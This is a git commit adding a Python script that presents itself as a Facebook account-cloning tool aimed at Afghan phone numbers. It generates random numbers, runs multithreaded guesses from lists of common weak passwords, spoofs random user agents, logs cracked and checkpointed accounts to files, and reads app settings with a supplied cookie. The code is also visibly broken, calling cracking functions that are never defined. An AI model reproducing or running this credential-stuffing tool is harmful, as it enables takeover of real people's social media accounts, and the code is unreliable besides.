f5fa6a44483d9df226b8c75ce033b94332e55e78
CyberAttack85 <153926827+CyberAttack85@users.noreply.github.com>
2023-12-18 06:57:21 -0800

    Add files via upload

---
+++ Inox24.py
@@ -0,0 +1,430 @@
+from os import path
+import os,base64,zlib,pip,urllib
+print('\n\033[1;37m install modules....\n It will take some seconds...PATHAN Update Tool..')
+os.system('xdg-open https://youtube.com/@khalidkhan23430')
+from bs4 import BeautifulSoup as sop
+from concurrent.futures import ThreadPoolExecutor as ThreadPool
+import os
+import random
+import requests,bs4,json,sys,random,datetime,time,re,subprocess,platform,struct
+from bs4 import BeautifulSoup as sop
+from concurrent.futures import ThreadPoolExecutor as tred
+import base64
+import os,sys,time,json,random,re,string,platform,base64
+import requests
+from concurrent.futures import ThreadPoolExecutor as ThreadPool
+import string
+try:
+    import requests
+except ImportError:
+    print('\n [✓] installing requests !...\n')
+    os.system('pip install requests')
+
+try:
+    import concurrent.futures
+except ImportError:
+    print('\n [✓] installing futures !...\n')
+    os.system('pip install futures')
+try:
+    import bs4
+except ImportError:
+    print('\n [✓] installing bs4 !...\n')
+    os.system('pip install bs4')
+    os.system('git pull')
+    os.system('pkg install curl')
+import requests, os, re, bs4,platform, sys, json, time, random, datetime, subprocess, threading, itertools,base64,uuid,zlib
+from concurrent.futures import ThreadPoolExecutor as ahmadAXI
+from datetime import datetime
+from bs4 import BeautifulSoup
+
+
+ct = datetime.now()
+n = ct.month
+bulan = ['January', 'February', 'March', 'April', 'May', 'June', 'July', 'Agustus', 'September', 'October', 'November', 'December']
+try:
+    if n < 0 or n > 12:
+        exit()
+    nTemp = n - 1
+except ValueError:
+    exit()
+
+current = datetime.now()
+ta = current.year
+bu = current.month
+ha = current.day
+op = bulan[nTemp]
+R = '\033[31;1m'
+x = '\33[m' # DEFAULT
+P = '\x1b[1;97m' # PUTIH
+M = '\x1b[1;91m' # MERAH
+H = '\x1b[1;92m' # HIJAU
+K = '\x1b[1;93m' # KUNING
+B = '\x1b[1;94m' # BIRU
+U = '\x1b[1;95m' # UNGU
+O = '\x1b[1;96m' # BIRU MUDA
+N = '\x1b[0m'    # WARNA MATI
+A = '\x1b[1;90m' # WARNA ABU ABU
+BN = '\x1b[1;107m' # BELAKANG PUTIH
+BBL = '\x1b[1;106m' # BELAKANG BIRU LANGIT
+BP = '\x1b[1;105m' # BELAKANG PINK
+BB = '\x1b[1;104m' # BELAKANG BIRU
+BK = '\x1b[1;103m' # BELAKANG KUNING
+BH = '\x1b[1;102m' # BELAKANG HIJAU
+BM = '\x1b[1;101m' # BELAJANG MERAH
+BA = '\x1b[1;100m' # BELAKANG ABU ABU
+A = '\x1b[1;97m' 
+#B = '\x1b[1;96m' 
+BLACK = '\x1b[1;90m' 
+C = '\x1b[1;91m' 
+D = '\x1b[1;92m'
+M = '\033[1;31m'
+H = '\033[1;32m'
+N = '\x1b[1;37m'    
+E = '\x1b[1;93m' 
+F = '\x1b[1;94m'
+G = '\x1b[1;95m'
+P = '\033[1;37m'
+
+
+#
+WW = '\033[97;1m' 
+RR = '\033[91;1m' 
+GG = '\033[92;1m' 
+YY = '\033[93;1m' 
+BB = '\033[94;1m'
+PP = '\033[95;1m'
+CC = '\033[96;1m'
+NN = '\x1b[0m'
+#
+
+RED = '\033[1;91m'
+WHITE = '\033[1;97m'
+GREEN = '\033[1;32m' #
+YELLOW = '\033[1;33m'
+BLUE = '\033[1;34m'
+ORANGE = '\033[1;35m'
+HBF = '{ HBF }'
+my_color = [
+ P, M, H, K, B, U, O, N]
+warna = random.choice(my_color)
+now = datetime.now()
+dt_string = now.strftime("%H:%M")
+current = datetime.now()
+ta = current.year
+bu = current.month
+ha = current.day
+
+ok = []
+mnum=[]
+cp = []
+id = []
+user = []
+loop = 0
+oks = []
+cps = []
+loop = 0
+url_lookup = "https://lookup-id.com/"
+url_mb = "https://mbasic.facebook.com"
+url_ip = "https://www.httpbin.org/ip"
+header_grup = {"user-agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36;]"}
+bulan_ttl = {"01": "January", "02": "February", "03": "March", "04": "April", "05": "May", "06": "June", "07": "July", "08": "Augustus", "09": "September", "10": "October", "11": "November", "12": "December"}
+done = False
+ugen=[]
+uas=[]
+usa = ["Mozilla/5.0 Macintosh; Intel Mac OS X 10_10_2) AppleWebKit/{str(rr(1111,9999))}.{str(rr(20,100))}.{str(rr(20,100))} (KHTML, like Gecko) Version/{str(rr(20,100))}.0.{str(rr(1111,9999))} Safari/{str(rr(1111,9999))}.{str(rr(20,100))}.{str(rr(20,100))}"]
+rr = random.randint
+for xd in range(10000):
+    aa='Mozilla/5.0 (Linux; U; Android'
+    b=random.choice(['3','4','5','6','7','8','9','10','11','12','13','14','15','16','17'])
+    c=' en-us; GT-'
+    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
+    e=random.randrange(1, 999)
+    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
+    g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
+    h=random.randrange(73,100)
+    i='0'
+    j=random.randrange(4200,4900)
+    k=random.randrange(40,150)
+    l='Mobile Safari/537.36'
+    uaku2=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
+    ugen.append(uaku2)
+
+
+for sat in range(1000):
+	a='NokiaX'
+	b=random.randrange(1,9)
+	c='-0'
+	d=random.randrange(1,9)
+	e='/'
+	f=random.randrange(1,9)
+	g='.0 ('
+	h=random.randrange(1,12)
+	i='Profile/MIDP-2.1 Configuration/CLDC-1.1'
+	j='UNTRUSTED/'
+	k=random.randrange(1,3)
+	l='.0'
+	uaku2=f'{a}{b}{c}{d}{e}{f}{g}{h}{i}{j}{k}{l}'
+	ugen.append(uaku2)
+
+nka = [
+"NokiaX2-02/8.0 (11.57) Profile/MIDP-2.1 Configuration/CLDC-1.1",
+"NokiaX4-01/5.0 (08.65) Profile/MIDP-2.1 Configuration/CLDC-1.1 UNTRUSTED/1.0",
+"nokia6610I/1.0 (4.10) Profile/MIDP-1.0 Configuration/CLDC-1.0 (FAST WAP Proxy/1.0)",
+]
+
+
+    
+
+    ##
+def uaku():
+    try:
+        ff=open('show.txt','r').read().splitlines()
+        for ub in ff:
+            ugen.append(ub)
+    except:
+        a=requests.get('https://raw.githubusercontent.com/Dark-Cyber-07/BLACK_XXX/main/show.txt').text
+        ff=open('show.txt','w')
+        aa=re.findall('line">(.*?)<',str(a))
+        for un in aa:
+            ff.write(un+'\n')
+        ff=open('show.txt','r').read().splitlines()
+def jalan(z):
+
+    for e in z + '\n':
+        sys.stdout.write(e)
+        sys.stdout.flush()
+        time.sleep(0.03)
+        
+        
+        
+        
+def psb(z):
+    for e in z + '\n':
+        sys.stdout.write(e)
+        sys.stdout.flush()
+        time.sleep(0.03)
+        
+os.system("clear")
+import requests,os
+fuckx=str(input("\033[1;97m[\033[92;1m?\033[1;97m]ENTER YOUR NAME :\033[1;97m "))
+name=fuckx.upper()
+print ('')
+
+psb('\033[1;97m[\033[92;1m•\033[1;97m]\033[1;97mWELCOME MY TOOLS  '+name)
+print('')
+print('\033[1;93mTOOLS UPDATE SUCCESSFUL ')
+print('')
+jalan('\033[1;97mLOADING\033[1;32m.\033[1;35m.\033[1;34m.\033[1;97m.\033[1;33m.\033[38;5;196m.\033[1;35m.\033[1;34m.\033[1;33m.\033[1;32m.\033[1;97m.\033[38;5;196m.\033[38;5;46m.\033[38;5;196m.\033[1;32m.\033[1;97m.\033[1;35m.\033[1;34m.\033[1;33m.\033[38;5;46m.\033[1;97m.')
+time.sleep(2)
+
+
+
+
+loop = 0
+cp = []
+ok = []
+uid = []
+
+def clear():
+    os.system('clear')
+from time import localtime as lt
+from os import system as cmd
+ltx = int(lt()[3])
+if ltx > 12:
+    a = ltx-12
+    tag = "PM"
+else:
+    a = ltx
+    tag = "AM"
+def banner():
+    clear()
+    print(f"""\033[1;92m
+    
+   ######     #    ####### #     #    #    #     # 
+   #     #   # #      #    #     #   # #   ##    # 
+   #     #  #   #     #    #     #  #   #  # #   # 
+   ######  #     #    #    ####### #     # #  #  # 
+   #       #######    #    #     # ####### #   # # 
+   #       #     #    #    #     # #     # #    ## 
+   #       #     #    #    #     # #     # #     # 
+
+\033[1;93m═══════════════════════════════════════════════════
+\033[1;37m│ ❲★❳ AUTHOR   : Khalid Khan                 
+\033[1;37m│ ❲★❳ FACEBOOK : Khalid Khan                   
+\033[1;37m│ ❲★❳ YOUTUBE  : Afghan Skills                   
+\033[1;37m│ ❲★❳ GITHUB   : Khalid Afghan 774           
+\033[1;37m│ ❲★❳ WHATSAPP : +93731227318                
+\033[1;37m│ ❲★❳ TOOLS    : Free                       
+\033[1;37m│ ❲★❳ VERSION  : 0.2                   
+\033[1;93m═══════════════════════════════════════════════════""")
+
+loop = 0
+ok = []
+uid = []
+
+
+def cek_apk(session,coki):
+    w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":coki}).text
+    sop = BeautifulSoup(w,"html.parser")
+    x = sop.find("form",method="post")
+    game = [i.text for i in x.find_all("h3")]
+    if len(game)==0:
+        print(f'%s{P}[%s×%s] %sSorry there is no Active  Apk%s         '%(N,M,N,B,N))
+    else:
+        print(f'[🔥] %s ☆ Your Active Apps ☆     :{B}'%(GREEN))
+        for i in range(len(game)):
+            print(f"[%s%s] {H}%s %s"%(N,i+1,game[i].replace("Ditambahkan pada"," Ditambahkan pada"),N))
+        
+    w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":coki}).text
+    sop = BeautifulSoup(w,"html.parser")
+    x = sop.find("form",method="post")
+    game = [i.text for i in x.find_all("h3")]
+    if len(game)==0:
+        print(f'%s[%s!%s] %sSorry there is no Expired Apk%s                \n'%(N,B,N,M,N))
+    else:
+        print(f'[✔] %s ☑ Your Expired Apps ☑    :{WHITE}'%(M))
+        for i in range(len(game)):
+            print(f"[%s%s] %s %s"%(N,i+1,game[i].replace("Kedaluwarsa"," Kedaluwarsa"),N))
+        else:
+            print("%s═════════════════════%s═════════════════════%s"%(M,H,P))
+
+
+
+def main():
+    os.system('clear')
+    banner()
+
+
+    
+    print("\033[38;5;46m•\033[38;5;196m•\033[1;35m•\033[1;34m•\033[1;33m•\033[1;32m•\033[1;97m•\033[38;5;196m•\033[38;5;46m•\033[1;35m•\033[1;34m•\033[1;33m•\033[1;32m•\033[1;97m•\033[38;5;196m•\033[38;5;46m•\033[1;32m•\033[1;35m•\033[1;34m•\033[1;97m•\033[1;33m•\033[38;5;196m•\033[1;35m•\033[1;34m•\033[1;33m•\033[1;32m•\033[1;97m•\033[38;5;196m•\033[38;5;46m•\033[38;5;196m•\033[1;32m•\033[1;97m•\033[1;35m•\033[1;34m•\033[1;33m•\033[38;5;46m•\033[1;97m•")
+    print(f"\033[1;97m[\033[92;1m1\033[1;97m]\033[1;97mFile CLONE ")
+    print(f"\033[1;97m[\033[92;1m2\033[1;97m]\033[1;97mOLD CLONE ")
+    print(f"\033[1;97m[\033[92;1m3\033[1;97m]\033[1;97mJOIN MY WHATSAPP GROUP ") 
+    print(f"\033[1;97m[\033[92;1m4\033[1;97m]\033[1;97mJOIN MY FACEBOOK GROUP  ")
+    print(f"\033[1;97m[\033[92;1m5\033[1;97m]\033[1;97mCONTACT TO ADMIN  ")
+    print(f"\033[1;97m[\033[92;1m0\033[1;97m]\033[1;91mEXIT  ")
+    print("")
+
+    sh = input("\033[0;97m[\033[38;5;208m?\033[0;97m]\033[0;97mCHOOSE : ")
+    if sh =='1':
+       random_apk()
+    if sh =='2':
+       menu()
+    if sh =='3':
+       os.system('xdg-open https://chat.whatsapp.com/DjCrfAdML127Ah4quyrMfz')
+       menu()
+    if sh =='4':
+       os.system('xdg-open https://facebook.com/groups/129218606793658/')
+       menu()
+    if sh =='5':
+       os.system('xdg-open https://whatsapp.com/dl/')
+       main()  
+    if sh =='0':
+    	exit ('   Thanks 🤗')
+        
+def menu():
+	os.system('clear')
+	banner()
+	print('\x1b[97;1m[1] Random Clone Method ')
+	print('\x1b[97;1m[2] Random Clone Method (with cookie)')
+	print('\x1b[97;1m[3] Random Clone Method ')
+	print(50*'_')
+	opt = input('\x1b[97;1m[√] SELECT OPT: ')
+	if opt =='1':
+		random_number1()
+	elif opt =='2':
+		random_number2()
+	
+	else:
+		print('\n\033[1;31mChoose valid option\033[0;97m')
+		menu()      
+    
+def random_number1():
+	user=[]
+	os.system('clear')
+	banner()
+	print(f"             {H} SIM {K}CODE{P}  ");time.sleep(0.05)
+	print("\033[38;5;46m•\033[38;5;196m•\033[1;35m•\033[1;34m•\033[1;33m•\033[1;32m•\033[1;97m•\033[38;5;196m•\033[38;5;46m•\033[1;35m•\033[1;34m•\033[1;33m•\033[1;32m•\033[1;97m•\033[38;5;196m•\033[38;5;46m•\033[1;32m•\033[1;35m•\033[1;34m•\033[1;97m•\033[1;33m•\033[38;5;196m•\033[1;35m•\033[1;34m•\033[1;33m•\033[1;32m•\033[1;97m•\033[38;5;196m•\033[38;5;46m•\033[38;5;196m•\033[1;32m•\033[1;97m•\033[1;35m•\033[1;34m•\033[1;33m•\033[38;5;46m•\033[1;97m•")
+	print(f"  {K}AFG : \033[1;97m 9370  9372  9374  9376  9377  9378  9379") 
+	print("\033[38;5;46m•\033[38;5;196m•\033[1;35m•\033[1;34m•\033[1;33m•\033[1;32m•\033[1;97m•\033[38;5;196m•\033[38;5;46m•\033[1;35m•\033[1;34m•\033[1;33m•\033[1;32m•\033[1;97m•\033[38;5;196m•\033[38;5;46m•\033[1;32m•\033[1;35m•\033[1;34m•\033[1;97m•\033[1;33m•\033[38;5;196m•\033[1;35m•\033[1;34m•\033[1;33m•\033[1;32m•\033[1;97m•\033[38;5;196m•\033[38;5;46m•\033[38;5;196m•\033[1;32m•\033[1;97m•\033[1;35m•\033[1;34m•\033[1;33m•\033[38;5;46m•\033[1;97m•")
+	kode = input(f'{M}    INPUT CODE {P}:{H} ')
+	os.system("clear")
+	banner()
+	doamin = ' \033[1;92mMETHUD 1 '
+	print(f'    {P}[{H}√{P}] EXAMPLE    : {K}2000/3000/5000/10000/20000')
+	limit = int(input(f'    %s[%s?%s] CRACK ID LIMIT : %s'%(N,K,N,H)))
+	for nmbr in range(limit):
+		koda = ''.join(random.choice(string.digits) for _ in range(2))
+		kodb = ''.join(random.choice(string.digits) for _ in range(2))
+		nmp = ''.join(random.choice(string.digits) for _ in range(4))
+		user.append(nmp)
+	with ThreadPool(max_workers=50) as yaari:
+		os.system('clear')
+		banner()
+		tl = str(len(user))
+		print(f" {P}[{H}★{P}]{WHITE} FROM        :\033[38;5;45m AFGHANISTAN")
+		print(f" {P}[{H}★{P}]{WHITE} CRACK ID    :\033[38;5;192m {GREEN}"+tl)
+		print(f' {P}[{H}★{P}]{WHITE} SIM CODE    :\033[1;92m {code} ')
+		print(f" {P}[{H}★{P}]{WHITE} METHUD      :\033[1;92m{doamin}")
+		print(f" {P}[{H}★{P}]{WHITE} COOKIE SAVE : PATHAN-RNDM-OK.txt  ")
+		print(f" {P}[{H}★{P}]{WHITE} FILE SAVE   : PATHAN-RNDM-OK.txt  ")
+		print(f" {P}[{H}★{P}]{WHITE} FILE SAVE   : PATHAN-RNDM-CP.txt  ")
+		print(f"\033[38;5;46m•\033[38;5;196m•\033[1;35m•\033[1;34m•\033[1;33m•\033[1;32m•\033[1;97m•\033[38;5;196m•\033[38;5;46m•\033[1;35m•\033[1;34m•\033[1;33m•\033[1;32m•\033[1;97m•\033[38;5;196m•\033[38;5;46m•\033[1;32m•\033[1;35m•\033[1;34m•\033[1;97m•\033[1;33m•\033[38;5;196m•\033[1;35m•\033[1;34m•\033[1;33m•\033[1;32m•\033[1;97m•\033[38;5;196m•\033[38;5;46m•\033[38;5;196m•\033[1;32m•\033[1;97m•\033[1;35m•\033[1;34m•\033[1;33m•\033[38;5;46m•\033[1;97m•")
+		print(f" {P}[{H}★{P}]{WHITE} FIRST [\033[1;92mON\033[1;92m/\033[38;5;196mOFF\033[1;37m] AIRPLANE MODE 💉 ")
+		print(f" {P}[{H}★{P}]{WHITE} \x1b[97m\033[37;41mMIX IDZ CLONING ENJOY USER\033[0;m ")
+		psb(f"\033[38;5;46m•\033[38;5;196m•\033[1;35m•\033[1;34m•\033[1;33m•\033[1;32m•\033[1;97m•\033[38;5;196m•\033[38;5;46m•\033[1;35m•\033[1;34m•\033[1;33m•\033[1;32m•\033[1;97m•\033[38;5;196m•\033[38;5;46m•\033[1;32m•\033[1;35m•\033[1;34m•\033[1;97m•\033[1;33m•\033[38;5;196m•\033[1;35m•\033[1;34m•\033[1;33m•\033[1;32m•\033[1;97m•\033[38;5;196m•\033[38;5;46m•\033[38;5;196m•\033[1;32m•\033[1;97m•\033[1;35m•\033[1;34m•\033[1;33m•\033[38;5;46m•\033[1;97m•")
+		for guru in user:
+			pwx = ['۱۲۳۴۵۶','100200','500500','700800','900900','10002000','50006000','kabul123','Afghan1234','kabul1234','afghanistan','Afghanistan','50005000']
+			yaari.submit(fcrack1,uid,pwx,tl)
+	print(50*'_')
+	print(' [💉] Crack process has been completed')
+	print(' [💉] Ids saved in ok.txt,cp.txt')
+	print(50*'_')
+	exit()
+	
+def random_number2():
+	user=[]
+	os.system('clear')
+	banner()
+	print(f"             {H} SIM {K}CODE{P}  ");time.sleep(0.05)
+	print("\033[38;5;46m•\033[38;5;196m•\033[1;35m•\033[1;34m•\033[1;33m•\033[1;32m•\033[1;97m•\033[38;5;196m•\033[38;5;46m•\033[1;35m•\033[1;34m•\033[1;33m•\033[1;32m•\033[1;97m•\033[38;5;196m•\033[38;5;46m•\033[1;32m•\033[1;35m•\033[1;34m•\033[1;97m•\033[1;33m•\033[38;5;196m•\033[1;35m•\033[1;34m•\033[1;33m•\033[1;32m•\033[1;97m•\033[38;5;196m•\033[38;5;46m•\033[38;5;196m•\033[1;32m•\033[1;97m•\033[1;35m•\033[1;34m•\033[1;33m•\033[38;5;46m•\033[1;97m•")
+	print(f"  {K}AFG : \033[1;97m 9370  9372  9374  9376  9377  9378  9379") 
+	print("\033[38;5;46m•\033[38;5;196m•\033[1;35m•\033[1;34m•\033[1;33m•\033[1;32m•\033[1;97m•\033[38;5;196m•\033[38;5;46m•\033[1;35m•\033[1;34m•\033[1;33m•\033[1;32m•\033[1;97m•\033[38;5;196m•\033[38;5;46m•\033[1;32m•\033[1;35m•\033[1;34m•\033[1;97m•\033[1;33m•\033[38;5;196m•\033[1;35m•\033[1;34m•\033[1;33m•\033[1;32m•\033[1;97m•\033[38;5;196m•\033[38;5;46m•\033[38;5;196m•\033[1;32m•\033[1;97m•\033[1;35m•\033[1;34m•\033[1;33m•\033[38;5;46m•\033[1;97m•")
+	kode = input(f'{M}    INPUT CODE {P}:{H} ')
+	os.system("clear")
+	banner()
+	doamin = ' \033[1;92mMETHUD 2 '
+	print(f'    {P}[{H}√{P}] EXAMPLE    : {K}2000/3000/5000/10000/20000')
+	limit = int(input(f'    %s[%s?%s] CRACK ID LIMIT : %s'%(N,K,N,H)))
+	for nmbr in range(limit):
+		koda = ''.join(random.choice(string.digits) for _ in range(2))
+		kodb = ''.join(random.choice(string.digits) for _ in range(2))
+		nmp = ''.join(random.choice(string.digits) for _ in range(4))
+		user.append(nmp)
+	with ThreadPool(max_workers=50) as yaari:
+		os.system('clear')
+		banner()
+		tl = str(len(user))
+		print(f" {P}[{H}★{P}]{WHITE} FROM      :\033[38;5;45m AFGHANISTAN")
+		print(f" {P}[{H}★{P}]{WHITE} CRACK ID  :\033[38;5;192m {GREEN}"+tl)
+		print(f' {P}[{H}★{P}]{WHITE} SIM CODE  :\033[1;92m {kode} ')
+		print(f" {P}[{H}★{P}]{WHITE} METHUD    :\033[1;92m{doamin}")
+		print(f" {P}[{H}★{P}]{WHITE} FILE SAVE : PATHAN-RNDM-OK.txt  ")
+		print(f" {P}[{H}★{P}]{WHITE} FILE SAVE : PATHAN-RNDM-CP.txt  ")
+		print(f"\033[38;5;46m•\033[38;5;196m•\033[1;35m•\033[1;34m•\033[1;33m•\033[1;32m•\033[1;97m•\033[38;5;196m•\033[38;5;46m•\033[1;35m•\033[1;34m•\033[1;33m•\033[1;32m•\033[1;97m•\033[38;5;196m•\033[38;5;46m•\033[1;32m•\033[1;35m•\033[1;34m•\033[1;97m•\033[1;33m•\033[38;5;196m•\033[1;35m•\033[1;34m•\033[1;33m•\033[1;32m•\033[1;97m•\033[38;5;196m•\033[38;5;46m•\033[38;5;196m•\033[1;32m•\033[1;97m•\033[1;35m•\033[1;34m•\033[1;33m•\033[38;5;46m•\033[1;97m•")
+		print(f" {P}[{H}★{P}]{WHITE} FIRST [\033[1;92mON\033[1;92m/\033[38;5;196mOFF\033[1;37m] AIRPLANE MODE 💉 ")
+		print(f" {P}[{H}★{P}]{WHITE} \x1b[97m\033[37;41mMIX IDZ CLONING ENJOY USER\033[0;m ")
+		psb(f"\033[38;5;46m•\033[38;5;196m•\033[1;35m•\033[1;34m•\033[1;33m•\033[1;32m•\033[1;97m•\033[38;5;196m•\033[38;5;46m•\033[1;35m•\033[1;34m•\033[1;33m•\033[1;32m•\033[1;97m•\033[38;5;196m•\033[38;5;46m•\033[1;32m•\033[1;35m•\033[1;34m•\033[1;97m•\033[1;33m•\033[38;5;196m•\033[1;35m•\033[1;34m•\033[1;33m•\033[1;32m•\033[1;97m•\033[38;5;196m•\033[38;5;46m•\033[38;5;196m•\033[1;32m•\033[1;97m•\033[1;35m•\033[1;34m•\033[1;33m•\033[38;5;46m•\033[1;97m•")
+		for guru in user:
+			pwx = ['۱۲۳۴۵۶','100200','500500','700800','900900','10002000','50006000','ahmad123','kabul123','Afghan1234','kabul1234','afghanistan','50005000','kabul12345']
+			yaari.submit(fcrack2,uid,pwx,tl)
+	print(50*'_')
+	print(' [💉] Crack process has been completed')
+	print(' [💉] Ids saved in ok.txt,cp.txt')
+	print(50*'_')
+	exit()
+    
+    
+    
+
+main()
